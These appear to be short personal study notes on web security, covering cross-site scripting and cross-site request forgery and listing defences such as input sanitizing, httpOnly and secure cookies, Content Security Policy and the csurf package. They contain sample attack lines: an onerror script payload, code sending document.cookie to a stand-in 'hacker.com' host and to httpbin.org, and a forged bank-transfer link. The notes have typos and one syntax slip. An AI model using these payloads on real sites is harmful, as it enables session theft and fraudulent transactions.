XSS - cross site scripting

<img src='/' onerror='alert(1);'>

window.location = 'hacker.com?cookie=' + document.cookie

need sanitize

CSRF - cross site request fortualy

ex site dublicator like google or others...
<a href="http://netbank.com/transfer.do?acct=Attacker&amount;=$100">Read more!</a>

fetch('https://httpbin.org/post', {method: 'POST' body:document.cookie})

need HEADERS

```js
res.cookie('session', '1', { httpOnly: true });
res.cookie('session', '1', { secure: true });
res.set({
  'Content-Security-Policy': "script-src 'self' 'https://apis.google.com/'",
});
res.send('string');
```

---

Sanitize input
No eval()
No document.write()
Content Security Policy
Secure + HTTPOnly Cookies

(npm i ) csurf
